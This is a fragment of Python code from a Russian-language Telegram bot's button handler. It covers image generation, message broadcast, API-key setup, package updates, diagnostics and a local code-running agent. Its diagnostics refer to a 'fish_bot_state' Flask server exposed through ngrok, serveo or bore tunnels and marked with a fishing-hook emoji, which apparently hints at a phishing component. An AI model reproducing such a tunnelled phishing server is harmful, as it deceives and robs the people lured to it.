                reply_markup=kb([btn("❌ Отмена", "agent_chat_start")]))

    # ══════════════════════════════════════════════════════════
    #  МЕНЮ ГЕНЕРАЦИИ КАРТИНОК
    # ══════════════════════════════════════════════════════════
    elif action == 'img_size':
        answer_callback(cb_id, "✅ Размер: " + arg)
        _img_settings.setdefault(chat_id, {})['size'] = arg
        send_message(f"✅ Размер: <b>{arg}</b>. Теперь опиши картинку или выбери провайдер.",
                     chat_id, reply_markup=kb([btn("◀️ К генерации", "menu_image")]))

    elif action == 'img_style':
        answer_callback(cb_id, "✅ Стиль выбран")
        _img_settings.setdefault(chat_id, {})['style_suffix'] = arg
        style_name = arg.split(',')[0]
        send_message(f"✅ Стиль: <b>{style_name}</b>. Теперь опиши картинку или выбери провайдер.",
                     chat_id, reply_markup=kb([btn("◀️ К генерации", "menu_image")]))

    elif action == 'menu_image':
        answer_callback(cb_id)
        providers = get_image_providers()
        free_list = [p['name'] for p in providers if p['works_free']]
        paid_list = [p['name'] for p in providers if not p['works_free'] and p['has_key']]
        info_text = (
            "🎨 <b>Генерация картинок</b>\n\n"
            "🆓 Бесплатно (без ключа): <b>{}</b>\n"
            "💳 Платные (ключ есть): <b>{}</b>\n\n"
            "Нажми кнопку провайдера или просто опиши картинку:".format(
                ", ".join(free_list) or "—",
                ", ".join(paid_list) or "—",
            ))
        edit_message(chat_id, msg_id, info_text,
            reply_markup=kb(
                [btn("🌸 Pollinations (free)", "img_gen:pollinations"),
                 btn("🤗 HuggingFace (free)",  "img_gen:huggingface")],
                [btn("🎯 DALL-E 3",            "img_gen:dalle"),
                 btn("🔮 Stability AI",        "img_gen:stability")],
                [btn("⚡ Авто (лучший)",        "img_gen:auto")],
                [btn("📐 1:1 квадрат",          "img_size:1024x1024"),
                 btn("📱 9:16 вертикаль",       "img_size:576x1024"),
                 btn("🖥 16:9 горизонталь",     "img_size:1024x576")],
                [btn("🎨 Реализм",             "img_style:photorealistic, highly detailed"),
                 btn("🎭 Аниме",               "img_style:anime style, vibrant colors"),
                 btn("🖼 Масло",               "img_style:oil painting, artistic")],
                [btn("🔎 Все провайдеры",       "hub_image_menu"),
                 btn("🔑 Добавить ключ",        "img_add_key")],
                [back_btn()],
            ))

    elif action == 'img_gen':
        answer_callback(cb_id)
        _wait_state[chat_id] = f'img_prompt:{arg}'
        edit_message(chat_id, msg_id,
            "🎨 <b>Провайдер: {}</b>\n\nОпиши картинку на любом языке:\n\n"
            "Примеры:\n"
            "• <i>кот в космосе, стиль аниме</i>\n"
            "• <i>sunset over mountains, photorealistic</i>\n"
            "• <i>киберпанк город ночью, неон</i>".format(arg),
            reply_markup=kb([btn("❌ Отмена", "menu_image")]))

    elif action == 'img_add_key':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'img_add_key'
        send_message(
            "🔑 <b>Добавить ключ для генерации картинок:</b>\n\n"
            "Напиши: <code>провайдер ВАШ_КЛЮЧ</code>\n\n"
            "Примеры:\n"
            "• <code>dalle sk-abc123...</code> → DALL-E (OpenAI)\n"
            "• <code>stability sk-abc123...</code> → Stability AI\n"
            "• <code>huggingface hf_abc123...</code> → HuggingFace",
            chat_id, reply_markup=kb([btn("❌ Отмена", "menu_image")]))

    # ══════════════════════════════════════════════════════════
    #  МЕНЮ ОТПРАВКИ СООБЩЕНИЙ
    # ══════════════════════════════════════════════════════════
    elif action == 'menu_send':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "📨 <b>Отправка сообщений</b>\n\nВыбери действие:",
            reply_markup=kb(
                [btn("👤 Пользователю",    "send_to:user"),
                 btn("📢 В канал/группу",  "send_to:channel")],
                [btn("📎 Переслать файл",  "send_to:file"),
                 btn("⏰ Отложить отправку","send_to:schedule")],
                [btn("📋 Запланированные", "send_scheduled"),
                 btn("📣 Рассылка",        "send_to:broadcast")],
                [back_btn()],
            ))

    elif action == 'send_to':
        answer_callback(cb_id)
        prompts = {
            'user':      ("👤 Кому? Введи @username или chat_id:",
                          "send_target:user"),
            'channel':   ("📢 Введи @channel_name или chat_id канала:",
                          "send_target:channel"),
            'file':      ("📎 Введи @username или chat_id получателя:",
                          "send_target:file"),
            'schedule':  ("⏰ Кому отправить? (@username или chat_id):",
                          "send_target:schedule"),
            'broadcast': ("📣 Введи список получателей через запятую:\n"
                          "<code>@user1, @user2, -100123456</code>:",
                          "send_targets:broadcast"),
        }
        text_p, next_state = prompts.get(arg, ("Введи получателя:", "send_target:user"))
        _wait_state[chat_id] = next_state
        send_message(text_p, chat_id, reply_markup=kb([btn("❌ Отмена", "menu_send")]))

    elif action == 'send_scheduled':
        answer_callback(cb_id)
        tasks = get_scheduled()
        if not tasks:
            send_message("📋 Нет запланированных сообщений.", chat_id,
                         reply_markup=kb([back_btn("menu_send")]))
        else:
            lines = ["📋 <b>Запланированные ({}):</b>".format(len(tasks))]
            now = time.time()
            for t in tasks[:10]:
                wait_sec = max(0, int(t['send_at'] - now))
                lines.append("• {} → через {}с: <i>{}</i>".format(
                    t['target'], wait_sec, t['text'][:40]))
            send_message("\n".join(lines), chat_id,
                         reply_markup=kb([back_btn("menu_send")]))

    # ══════════════════════════════════════════════════════════
    #  ДОБАВЛЕНИЕ API КЛЮЧА (удобный мастер)
    # ══════════════════════════════════════════════════════════
    elif action == 'llm_add_key':
        answer_callback(cb_id)
        # Если arg задан — сразу ждём ввод ключа для конкретного провайдера
        if arg:
            _wait_state[chat_id] = f'llm_key_for:{arg}'
            provider_info = {
                'groq':       ('https://console.groq.com/keys',         '🆓 Бесплатно'),
                'openai':     ('https://platform.openai.com/api-keys',  '💳 Платно'),
                'gemini':     ('https://aistudio.google.com/apikey',    '🆓 Бесплатно'),
                'claude':     ('https://console.anthropic.com/',        '💳 Платно'),
                'openrouter': ('https://openrouter.ai/keys',            '🆓 Есть бесплатные'),
                'cerebras':   ('https://cloud.cerebras.ai',             '🆓 Бесплатно'),
                'sambanova':  ('https://cloud.sambanova.ai',            '🆓 Бесплатно'),
                'together':   ('https://api.together.xyz',              '💳 + триал'),
                'mistral':    ('https://console.mistral.ai/',           '💳 + триал'),
                'deepseek':   ('https://platform.deepseek.com/api-keys','💳 Дёшево'),
                'xai':        ('https://console.x.ai/',                 '💳 Платно'),
            }
            info = provider_info.get(arg, ('', ''))
            reg_url, price = info if info else ('', '')
            send_message(
                f"🔑 <b>Ключ для {arg.upper()}</b>\n\n"
                f"{price}\n"
                + (f"Получить ключ: {reg_url}\n\n" if reg_url else "") +
                f"Просто вставь API ключ сюда 👇",
                chat_id, reply_markup=kb([btn("❌ Отмена", "menu_llm")]))
        else:
            # Общий мастер — выбор провайдера кнопками
            _wait_state[chat_id] = 'llm_add_key'
            send_message(
                "🔑 <b>Добавить API ключ</b>\n\n"
                "Выбери провайдер или напиши: <code>провайдер КЛЮЧ</code>\n\n"
                "Бесплатные (регистрация ~1 мин):",
                chat_id, reply_markup=kb(
                    [btn("⚡ Groq (free)",      "llm_add_key:groq"),
                     btn("💎 Gemini (free)",    "llm_add_key:gemini")],
                    [btn("🌐 OpenRouter (free)","llm_add_key:openrouter"),
                     btn("🧠 Cerebras (free)", "llm_add_key:cerebras")],
                    [btn("🔥 SambaNova (free)", "llm_add_key:sambanova"),
                     btn("🐋 DeepSeek (cheap)", "llm_add_key:deepseek")],
                    [btn("🔵 OpenAI",           "llm_add_key:openai"),
                     btn("🟣 Claude",           "llm_add_key:claude")],
                    [btn("❌ Отмена", "menu_llm")],
                ))

    # ══════════════════════════════════════════════════════════
    #  БЕСПЛАТНЫЕ МОДЕЛИ
    # ══════════════════════════════════════════════════════════
    elif action == 'llm_free':
        answer_callback(cb_id)
        FREE_PROVIDERS = {
            # ── Без регистрации ──────────────────────────────────────────
            '🌸 Pollinations LLM': ('openai', 'openai',
                                'OPENAI_API_KEY', 'https://image.pollinations.ai'),
            # ── Бесплатный ключ за 1 мин ─────────────────────────────────
            '⚡ Groq (70B fast)':   ('groq',       'llama-3.3-70b-versatile',
                                    'GROQ_API_KEY', 'https://console.groq.com/keys'),
            '⚡ Groq DeepSeek R1':  ('groq',       'llama-3.3-70b-versatile',
                                    'GROQ_API_KEY', 'https://console.groq.com/keys'),
            '⚡ Groq Qwen3-32B':    ('groq',       'qwen/qwen3-32b',
                                    'GROQ_API_KEY', 'https://console.groq.com/keys'),
            '💎 Gemini 2.0 Flash':  ('gemini',     'gemini-2.0-flash',
                                    'GEMINI_API_KEY', 'https://aistudio.google.com/apikey'),
            '💎 Gemini 2.5 Flash':  ('gemini',     'gemini-2.5-flash-preview-04-17',
                                    'GEMINI_API_KEY', 'https://aistudio.google.com/apikey'),
            '🌐 OR Llama 3.3 70B':  ('openrouter', 'meta-llama/llama-3.3-70b-instruct:free',
                                    'OPENROUTER_API_KEY', 'https://openrouter.ai/keys'),
            '🌐 OR DeepSeek R1':    ('openrouter', 'deepseek/deepseek-r1:free',
                                    'OPENROUTER_API_KEY', 'https://openrouter.ai/keys'),
            '🌐 OR Qwen3 235B':     ('openrouter', 'qwen/qwen3-235b-a22b:free',
                                    'OPENROUTER_API_KEY', 'https://openrouter.ai/keys'),
            '🧠 Cerebras Llama 70B':('cerebras',   'llama-3.3-70b',
                                    'CEREBRAS_API_KEY', 'https://cloud.cerebras.ai'),
            '🔥 SambaNova 70B':     ('sambanova',  'Meta-Llama-3.3-70B-Instruct',
                                    'SAMBANOVA_API_KEY', 'https://cloud.sambanova.ai'),
        }
        lines = ["🆓 <b>Бесплатные LLM провайдеры:</b>\n"]
        rows = []
        for label, (prov, model, key_attr, reg_url) in FREE_PROVIDERS.items():
            has_key = bool(getattr(config, key_attr, '') or os.environ.get(key_attr, ''))
            status  = "✅ ключ есть" if has_key else "🔑 нужен ключ (бесплатно)"
            lines.append(f"<b>{label}</b>: <code>{model}</code>\n   {status}\n   Регистрация: {reg_url}\n")
            mark = " ✅" if has_key else ""
            rows.append([btn_model(f"{label}{mark}", prov, model)])
        rows.append([btn("🔑 Добавить ключ", "llm_add_key"), back_btn("menu_llm")])
        edit_message(chat_id, msg_id, "\n".join(lines), reply_markup=kb(*rows))

    # ══════════════════════════════════════════════════════════
    #  ОБНОВЛЕНИЕ / ДИАГНОСТИКА
    # ══════════════════════════════════════════════════════════
    elif action == 'menu_update':
        answer_callback(cb_id)
        import sys as _sysup
        info = get_bot_info()
        rows = [
            [btn("📦 Проверить зависимости", "update_check_deps")],
            [btn("⬆️ Обновить core пакеты",  "update_upgrade"),
             btn("🔧 Установить пакет",       "update_install")],
            [btn("🔄 Обновить yt-dlp",        "update:ytdlp"),
             btn("📋 Весь pip",               "update:pip")],
            [btn("🔍 Найти рабочий LLM",      "update:llm_scan")],
            [btn("🩺 Самодиагностика",        "update_diag")],
        ]
        # Windows: кнопка установки ffmpeg
        if _sysup.platform == 'win32':
            rows.insert(-1, [btn("🎵 Установить ffmpeg (Windows)", "update:ffmpeg_win")])
        rows.append([back_btn()])
        edit_message(chat_id, msg_id, format_bot_info(info), reply_markup=kb(*rows))

    elif action == 'update_check_deps':
        answer_callback(cb_id, "Проверяю...")
        def _do_deps():
            deps = check_dependencies()
            report = format_deps_report(deps)
            missing = [d['name'] for d in deps if not d['installed'] and not d['optional']]
            rows = []
            if missing:
                rows.append([btn("⬆️ Установить недостающие", "update_install_missing")])
            rows.append([back_btn("menu_update")])
            send_message(report, chat_id, reply_markup=kb(*rows))
        _run_in_thread(_do_deps)

    elif action == 'update_upgrade':
        answer_callback(cb_id)
        send_message("⬆️ Обновляю пакеты... (может занять минуту)", chat_id)
        def _do_upgrade():
            results = upgrade_core(
                on_progress=lambda pkg, ok, msg:
                    send_message(f"{'✅' if ok else '⏳' if ok is None else '❌'} {pkg}: {msg[:60]}", chat_id)
                    if ok is not None else None
            )
            ok_list  = ', '.join(results['ok']) or '—'
            bad_list = ', '.join(d['pkg'] for d in results['failed']) or '—'
            send_message(
                "✅ Обновлено: <b>{}</b>\n❌ Ошибки: <b>{}</b>".format(ok_list, bad_list),
                chat_id, reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_upgrade)

    elif action == 'update_install':
        answer_callback(cb_id)
        _wait_state[chat_id] = 'update_install_pkg'
        send_message(
            "🔧 Введи название пакета:\n"
            "Примеры:\n"
            "• <code>yt-dlp</code>\n"
            "• <code>openai</code>\n"
            "• <code>python-docx</code>",
            chat_id, reply_markup=kb([btn("❌ Отмена", "menu_update")]))

    elif action == 'update_install_missing':
        answer_callback(cb_id, "Устанавливаю...")
        def _do_install_missing():
            from updater import CORE_PACKAGES, get_package_versions
            installed = get_package_versions()
            missing = [p for p in CORE_PACKAGES
                       if not installed.get(p.lower().replace('-','_'))
                       and not installed.get(p.lower())]
            if not missing:
                send_message("✅ Все core-пакеты уже установлены!", chat_id,
                             reply_markup=kb([back_btn("menu_update")]))
                return
            for pkg in missing:
                send_message(f"📦 Устанавливаю {pkg}...", chat_id)
                ok, msg = install_package(pkg)
                send_message(f"{'✅' if ok else '❌'} {pkg}: {msg[:80]}", chat_id)
            send_message("✅ Готово", chat_id,
                         reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_install_missing)

    elif action == 'update_diag':
        answer_callback(cb_id, "Диагностика...")
        def _do_diag():
            lines = ["🩺 <b>Самодиагностика</b>\n"]
            # Проверка TG токена
            token = config.TELEGRAM_BOT_TOKEN
            lines.append(f"{'✅' if token else '❌'} Telegram токен: {'есть' if token else 'НЕТ!'}")
            # Проверка LLM
            prov = config.LLM_PROVIDER
            key  = config.get_key(prov) if prov != 'ollama' else '(не нужен)'
            lines.append(f"{'✅' if key else '⚠️'} LLM ({prov}): {'ключ есть' if key else 'нет ключа'}")
            # Проверка TTS
            tts = config.TTS_PROVIDER
            lines.append(f"✅ TTS: {tts} / {config.TTS_VOICE}")
            # Проверка Python-версии
            import sys as _sys
            py_ver = _sys.version.split()[0]
            ok_py  = tuple(int(x) for x in py_ver.split('.')[:2]) >= (3, 8)
            lines.append(f"{'✅' if ok_py else '❌'} Python: {py_ver}")
            # Проверка зависимостей
            deps = check_dependencies()
            missing = [d['name'] for d in deps if not d['installed'] and not d['optional']]
            if missing:
                lines.append(f"⚠️ Не установлено: {', '.join(missing)}")
            else:
                lines.append("✅ Все core-зависимости установлены")
            # Проверка .env
            from config import ENV_PATH
            lines.append(f"{'✅' if os.path.exists(ENV_PATH) else '❌'} .env файл: {'найден' if os.path.exists(ENV_PATH) else 'НЕТ!'}")
            # Проверка Flask порта
            try:
                import fish_bot_state as fbs
                lines.append(f"{'🟢' if fbs.server_running else '🔴'} Flask: {'запущен' if fbs.server_running else 'остановлен'}")
            except Exception:
                lines.append("⬜ Flask: неизвестно")
            send_message("\n".join(lines), chat_id,
                         reply_markup=kb([back_btn("menu_update")]))
        _run_in_thread(_do_diag)

    elif action == 'llm_all_providers':
        answer_callback(cb_id)
        # Показываем полный список провайдеров постранично
        from llm_checker import PROVIDERS as ALL_PROVS
        all_names = sorted(ALL_PROVS.keys())
        rows = []
        for i in range(0, len(all_names), 3):
            chunk = all_names[i:i+3]
            row = []
            for name in chunk:
                has_key = bool(getattr(config, name.upper() + '_API_KEY', '')
                               or os.environ.get(name.upper() + '_API_KEY', ''))
                mark = " ✅" if has_key else ""
                row.append(btn(f"{name}{mark}", f"llm_info:{name}"))
            rows.append(row)
        rows.append([btn("🔑 Добавить ключ", "llm_add_key"), back_btn("menu_llm")])
        edit_message(chat_id, msg_id,
            f"📋 <b>Все провайдеры ({len(all_names)}):</b>\n✅ = есть ключ",
            reply_markup=kb(*rows))

    elif action == 'llm_pick_current':
        answer_callback(cb_id)
        prov = config.LLM_PROVIDER
        models = RECOMMENDED.get(prov, [])
        if not models:
            send_message(f"❌ Нет рекомендованных моделей для {prov}", chat_id,
                         reply_markup=kb([back_btn("menu_llm")]))
        else:
            rows = []
            for m in models[:8]:
                cur = " ✅" if m == config.LLM_MODEL else ""
                rows.append([btn_model(f"{m}{cur}", prov, m)])
            rows.append([back_btn("menu_llm")])
            edit_message(chat_id, msg_id,
                f"🔄 <b>Модели {prov}:</b>\nТекущая: <code>{config.LLM_MODEL}</code>",
                reply_markup=kb(*rows))



    elif action == 'update':
        answer_callback(cb_id)
        if arg == 'pip':
            send_message("📦 Обновляю зависимости...", chat_id)
            def _do_pip():
                import subprocess as _sp
                reqs = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'requirements.txt')
                cmd = [sys.executable, '-m', 'pip', 'install', '--upgrade', '-r', reqs] + _pip_flags()
                r = _sp.run(cmd, capture_output=True, text=True, timeout=120)
                lines = (r.stdout + r.stderr).strip().splitlines()
                # Берём последние 20 строк
                summary = '\n'.join(lines[-20:]) if lines else 'нет вывода'
                msg = "✅ <b>pip обновление завершено</b>\n<pre>{}</pre>".format(
                    summary[:2000].replace('<','&lt;').replace('>','&gt;'))
                send_message(msg, chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
            _run_in_thread(_do_pip)

        elif arg == 'ytdlp':
            send_message("🤖 Обновляю yt-dlp...", chat_id)
            def _do_ytdlp():
                import subprocess as _sp
                r = _sp.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'yt-dlp'] + _pip_flags(),
                            capture_output=True, text=True, timeout=60)
                out = (r.stdout + r.stderr).strip()
                ver_r = _sp.run(['yt-dlp', '--version'], capture_output=True, text=True)
                ver = ver_r.stdout.strip()
                send_message(f"✅ yt-dlp обновлён!\nВерсия: <b>{ver}</b>",
                             chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
            _run_in_thread(_do_ytdlp)

        elif arg == 'llm_scan':
            send_message("🔍 Сканирую бесплатные LLM...", chat_id)
            def _do_scan():
                from llm_client import check_all_providers as _cap
                results = _cap(dict(__import__('os').environ))
                ok = [r for r in results if r.get('ok')]
                lines = [f"🆓 <b>Рабочие провайдеры ({len(ok)}/{len(results)}):</b>\n"]
                for r in ok:
                    lines.append(f"✅ {r.get('provider','?')} — {r.get('model','?')}")
                send_message('\n'.join(lines[:20]), chat_id,
                             reply_markup=kb([btn("◀️ Обновление", "menu_update"),
                                              btn("🧠 LLM меню", "menu_llm")]))
            _run_in_thread(_do_scan)

        elif arg == 'ffmpeg_win':
            answer_callback(cb_id, "Устанавливаю ffmpeg...")
            def _do_ffmpeg_win():
                import subprocess as _sp, sys as _sys
                send_message(
                    "🎵 <b>Установка ffmpeg на Windows</b>\n\n"
                    "Пробую через winget...",
                    chat_id)
                # Метод 1: winget
                import shutil as _sh1
                if not _sh1.which('winget'):
                    r1 = type('R', (), {'returncode': 1, 'stdout': '', 'stderr': 'winget not found'})()
                else:
                    r1 = _sp.run(['winget', 'install', 'Gyan.FFmpeg', '--silent', '--accept-package-agreements'],
                             capture_output=True, text=True, timeout=180)
                if r1.returncode == 0:
                    send_message(
                        "✅ <b>ffmpeg установлен через winget!</b>\n"
                        "Перезапусти бота чтобы ffmpeg стал доступен.\n"
                        "<code>python bot.py</code>",
                        chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
                    return
                # Метод 2: choco (только если установлен)
                import shutil as _sh2
                if not _sh2.which('choco'):
                    r2 = type('R', (), {'returncode': 1, 'stdout': '', 'stderr': 'choco not found'})()
                else:
                    r2 = _sp.run(['choco', 'install', 'ffmpeg', '-y'],
                                 capture_output=True, text=True, timeout=180)
                if r2.returncode == 0:
                    send_message("✅ <b>ffmpeg установлен через Chocolatey!</b>", chat_id,
                                 reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
                    return
                # Не удалось — даём инструкцию
                send_message(
                    "❌ Авто-установка не удалась.\n\n"
                    "<b>Установи вручную:</b>\n"
                    "1. Скачай с <b>https://ffmpeg.org/download.html</b>\n"
                    "2. Распакуй в <code>C:\\ffmpeg</code>\n"
                    "3. Добавь <code>C:\\ffmpeg\\bin</code> в PATH\n"
                    "4. Перезапусти бота\n\n"
                    "<b>Или через winget:</b>\n"
                    "<code>winget install Gyan.FFmpeg</code>",
                    chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))
            _run_in_thread(_do_ffmpeg_win)

        elif arg == 'changelog':
            answer_callback(cb_id)
            send_message(
                "📋 <b>История изменений АВТОМУВИ v2.1</b>\n\n"
                "✅ <b>Последние добавления:</b>\n"
                "• 🎬 YouTube → MP3/MP4 с выбором формата\n"
                "• 📁 Файловый менеджер\n"
                "• 🤖 Агент-кодер: Sandbox, Bot Tools\n"
                "• 💬 ИИ-чат: веб-поиск, смена роли\n"
                "• 🎨 Генерация картинок (4 провайдера)\n"
                "• 📨 Отправка сообщений и рассылка\n"
                "• 🔑 Удобное добавление API ключей\n"
                "• 🔄 Менеджер обновлений\n"
                "• 🩺 Встроенная диагностика\n"
                "• 🐛 Фикс 409 конфликт инстансов\n"
                "• 🐛 Фикс BUTTON_DATA_INVALID (64б)\n"
                "• 🐛 Фикс list index out of range\n",
                chat_id, reply_markup=kb([btn("◀️ Обновление", "menu_update")]))

    # ══ ДИАГНОСТИКА ══════════════════════════════════════════════════
    elif action == 'selfcheck':
        answer_callback(cb_id)
        send_message("🩺 Запускаю диагностику...", chat_id)
        def _do_check():
            import subprocess as _sp, sys
            lines = ["🩺 <b>Диагностика АВТОМУВИ</b>\n"]

            # Python версия
            lines.append(f"🐍 Python: <b>{sys.version.split()[0]}</b>")

            # Платформа
            import platform
            lines.append(f"💻 Платформа: <b>{platform.system()} {platform.machine()}</b>")

            # yt-dlp
            try:
                r = _sp.run(['yt-dlp', '--version'], capture_output=True, text=True, timeout=5)
                lines.append(f"🎬 yt-dlp: ✅ <b>{r.stdout.strip()}</b>")
            except Exception:
                lines.append("🎬 yt-dlp: ❌ не установлен")

            # ffmpeg
            try:
                r = _sp.run(['ffmpeg', '-version'], capture_output=True, text=True, timeout=5)
                ver = r.stdout.splitlines()[0].split()[2] if r.stdout else '?'
                lines.append(f"🎵 ffmpeg: ✅ <b>{ver}</b>")
            except Exception:
                lines.append("🎵 ffmpeg: ⚠️ не найден (нужен для mp3)")

            # LLM статус
            provider = config.LLM_PROVIDER
            model    = config.LLM_MODEL
            lines.append(f"\n🧠 LLM: <b>{provider} / {model}</b>")

            # Ключи
            key_checks = [
                ('GROQ_API_KEY',       'Groq'),
                ('OPENAI_API_KEY',     'OpenAI'),
                ('GEMINI_API_KEY',     'Gemini'),
                ('ANTHROPIC_API_KEY',  'Claude'),
                ('OPENROUTER_API_KEY', 'OpenRouter'),
                ('CEREBRAS_API_KEY',   'Cerebras'),
                ('STABILITY_API_KEY',  'Stability'),
                ('HF_API_KEY',         'HuggingFace'),
            ]
            lines.append("\n🔑 <b>API ключи:</b>")
            for env_key, name in key_checks:
                val = os.environ.get(env_key, '') or getattr(config, env_key, '')
                if val:
                    short = val[:8] + '...'
                    lines.append(f"  ✅ {name}: <code>{short}</code>")
                else:
                    lines.append(f"  ❌ {name}: нет ключа")

            # Flask
            try:
                import fish_bot_state as _fbs
                flask_ok = _fbs.server_running
                tunnel   = _fbs.tunnel_url or _fbs.bore_url or _fbs.ngrok_url or _fbs.serveo_url
                lines.append(f"\n🎣 Flask: {'✅ работает' if flask_ok else '❌ не запущен'}")
                lines.append(f"🚇 Туннель: {tunnel or '❌ нет'}")
            except Exception:
                pass

            # ffmpeg install hint on Windows
            import sys as _sys
            if _sys.platform == 'win32':
                try:
                    _sp.run(['ffmpeg', '-version'], capture_output=True, timeout=3)
                except Exception:
                    lines.append("💡 <b>Установка ffmpeg (Windows):</b>")
                    lines.append("  • <code>winget install Gyan.FFmpeg</code>")
                    lines.append("  • или <code>choco install ffmpeg</code>")
                    lines.append("  • или скачай с <b>ffmpeg.org</b> и добавь в PATH")

            # Дисковое место (кросс-платформенно)
            free_mb = _disk_free_mb()
            if free_mb is not None:
                free_str = f"{free_mb:,} MB" if free_mb < 10240 else f"{free_mb // 1024} GB"
                lines.append(f"\n💾 Свободно: <b>{free_str}</b>")

            # RAM
            ram = _ram_info_mb()
            if ram:
                total_mb, avail_mb = ram
                lines.append(f"🧠 RAM: <b>{avail_mb:,} MB</b> / {total_mb:,} MB")

            # CPU count
            try:
                import os as _os2
                cpu = _os2.cpu_count() or '?'
                lines.append(f"⚙️ CPU: <b>{cpu} ядер</b>")
            except Exception:
                pass

            # Аптайм бота
            try:
                uptime_sec = int(time.time() - _BOT_START_TIME)
                h, rem = divmod(uptime_sec, 3600)
                m, s = divmod(rem, 60)
                lines.append(f"⏱ Аптайм: <b>{h}ч {m}м {s}с</b>")
            except Exception:
                pass

            send_message('\n'.join(lines), chat_id,
                reply_markup=kb(
                    [btn("🧪 Тест LLM", "test"),
                     btn("📦 Обновить pip", "update:pip")],
                    [btn("🔄 Обновить yt-dlp", "update:ytdlp"),
                     btn("🔍 Проверить LLM", "check_providers")],
                    [back_btn()],
                ))
        _run_in_thread(_do_check)

    elif action == 'agent_end':
        info = session_info(chat_id)
        end_session(chat_id)
        answer_callback(cb_id, "✅ Сессия завершена")
        msgs = info['messages'] if info else 0
        elapsed = info['elapsed'] if info else '—'
        edit_message(chat_id, msg_id,
            "✅ <b>Сессия завершена</b>\n"
            "Сообщений: {} | Время: {}".format(msgs, elapsed),
            reply_markup=menu_keyboard(chat_id))

    elif action == 'agent_clear':
        sess = get_session(chat_id)
        if sess:
            sess['history'].clear()
        answer_callback(cb_id, "🗑 История очищена")
        send_message("🗑 История диалога очищена.", chat_id,
                    reply_markup=chat_control_keyboard())

    elif action == 'agent_status':
        info = session_info(chat_id)
        if info:
            mode_name = "💬 Чат" if info['mode'] == 'chat' else "💻 Кодер"
            answer_callback(cb_id,
                "{} | {} сообщ. | {}".format(mode_name, info['messages'], info['elapsed']))
        else:
            answer_callback(cb_id, "Нет активной сессии")

    elif action == 'agent_help':
        answer_callback(cb_id)
        edit_message(chat_id, msg_id,
            "ℹ️ <b>Как пользоваться ИИ-агентом</b>\n\n"
            "<b>💬 Чат-режим:</b>\n"
            "Просто пишешь сообщения боту — он отвечает как ChatGPT.\n"
            "История сохраняется в рамках сессии.\n"
            "Команды: /chat для запуска, /endchat для завершения.\n\n"
            "<b>💻 Агент-кодер:</b>\n"
            "Описываешь задачу словами.\n"
            "Агент генерирует Python-код, запускает его (таймаут 30с), показывает вывод.\n"
            "Если код падает — сам исправляет (до 4 попыток).\n"
            "Команды: /code для запуска.\n\n"
            "<b>⚠️ Важно:</b> Код выполняется локально на твоём сервере.\n"
            "Используй только для доверенных задач.",
            reply_markup=kb(
                [btn("💬 Начать чат", "agent_chat_start"),
                 btn("💻 Агент-кодер", "agent_code_start")],
                [back_btn("menu_agent")],
            ))

    # ── Выбор режима генерации проекта ───────────────────────
    elif action == 'proj_mode':
        pending = _pending_agent_task.pop(chat_id, None)
        if not pending:
            answer_callback(cb_id, "❌ Задача не найдена", alert=True)
            return

        if arg == 'tools':
            answer_callback(cb_id, "🤖 Agent pipeline — запускаю!")
            task_text = pending.get('task', '')
            edit_message(chat_id, msg_id,
                "🤖 <b>Agent pipeline</b>\n"
                f"Задача: <i>{task_text[:100]}</i>\n\n"
                "planner → executor → memory",
                reply_markup=None)
            def _do_pipeline(_task=task_text):
                if AGENT_CORE_ENABLED:
                    result = _agent_core.run(
                        task=_task, chat_id=chat_id, user_id=chat_id,
                        mode='scaffold',
                        on_status=lambda m: send_message(m, chat_id),
                    )
                    final = _strip_think(_agent_core.status_text(result))
                    send_message(final, chat_id, reply_markup=chat_control_keyboard())
                    from telegram_client import send_document
                    import os as _os
                    for p in result.get('artifacts', [])[:5]:
                        if _os.path.exists(p):
                            send_document(p, caption=f"📎 {_os.path.basename(p)}", chat_id=chat_id)
                else:
                    # Fallback на старый путь
                    final, results = run_agent_with_tools(
                        chat_id, _task,
                        on_status=lambda m: send_message(m, chat_id),
                    )
                    send_message(_strip_think(final)[:3500] if final else "✅ Готово",
                                 chat_id, reply_markup=chat_control_keyboard())
            _run_in_thread(_do_pipeline)
            return

        if arg == 'cancel':
            answer_callback(cb_id, "❌ Отменено")
            edit_message(chat_id, msg_id, "❌ Генерация отменена.",
                         reply_markup=chat_control_keyboard())
            return

        mode_labels = {
            'plan':      '🧩 Двухэтапный план',
            'onebyone':  '📄 Один файл за раз',
            'scaffold':  '🏗 Скаффолдер-скрипт',
        }
        label = mode_labels.get(arg, arg)
        answer_callback(cb_id, "{}  — запускаю!".format(label))
        edit_message(chat_id, msg_id,
            "⚙️ Режим: <b>{}</b>\nЗадача: <i>{}</i>\n\nГенерирую...".format(
                label, pending['task'][:100]),
            reply_markup=None)

        _run_in_thread(_run_code_task, chat_id, pending['task'], arg)

    # ── Действия с загруженным файлом (после анализа) ────────
    elif action == 'file_action':
        pending = _pending_file.get(chat_id)

        if arg == 'close':
            _pending_file.pop(chat_id, None)
            answer_callback(cb_id, "Закрыто")
            edit_message(chat_id, msg_id, "📁 Файл закрыт. Продолжай работу.",
                         reply_markup=chat_control_keyboard())
            return

        if arg == 'custom':
            answer_callback(cb_id, "Напиши свой запрос 👇")
            edit_message(chat_id, msg_id,
                "✏️ <b>Напиши что сделать с файлом</b>\n"
                "Файл: <code>{}</code>".format(
                    pending['filename'] if pending else 'неизвестен'),
                reply_markup=kb([btn("❌ Отмена", "file_action:close")]))
            # _pending_file остаётся — следующий текст попадёт в агент с файлом
            _wait_state[chat_id] = 'file_custom_input'
            return

        if not pending:
            answer_callback(cb_id, "❌ Файл не найден. Загрузи снова.", alert=True)
            return

        action_map = {
            'review':  ("🔍 Ищу ошибки и проблемы...", "review",
                        "Проанализируй код, найди все ошибки, баги, проблемы безопасности. "
                        "Верни исправленную версию."),
            'fix':     ("🔧 Исправляю ошибки...", "fix",
                        "Найди и исправь все ошибки в коде. Верни полный исправленный файл."),
            'explain': ("📖 Объясняю код...", "review",
                        "Подробно объясни что делает этот код: архитектуру, логику, "
                        "основные функции. На русском языке."),
